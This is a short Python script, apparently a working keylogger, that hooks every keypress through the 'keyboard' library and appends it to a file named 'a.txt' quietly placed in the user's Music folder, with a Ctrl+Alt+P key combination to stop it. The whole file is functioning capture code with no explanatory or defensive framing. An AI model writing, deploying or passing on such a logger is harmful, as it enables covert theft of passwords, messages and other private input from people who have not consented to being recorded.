import os
import keyboard
from pathlib import Path

KEYS =['enter','ctrl','alt','backspace']
COMBINATION = {'ctrl', 'alt', 'p'}
DOWNLOAD_PATH = str(Path.home() / "Music")

def create_file(path: str):
    file = open(path, "w")
    file.close()

def check_file(path: str):
    if not os.path.exists(path+"a.txt"):
        create_file(path=f"{path}a.txt")
    return f"{path}a.txt"

def write_keypress_to_file(e):
    file_name = check_file(path=f"{DOWNLOAD_PATH}/")
    if e.event_type == 'down':
        if all(keyboard.is_pressed(key) for key in COMBINATION):
            os._exit(0)
        with open(file_name, "a") as file:
            if len(e.name)>1 or e.name in KEYS:
                if e.name == "space":
                    file.write(" <space> ")
                else:
                    file.write(f"\n<{e.name}>\n")
            else:
                file.write(e.name)

keyboard.on_press(write_keypress_to_file)
keyboard.wait()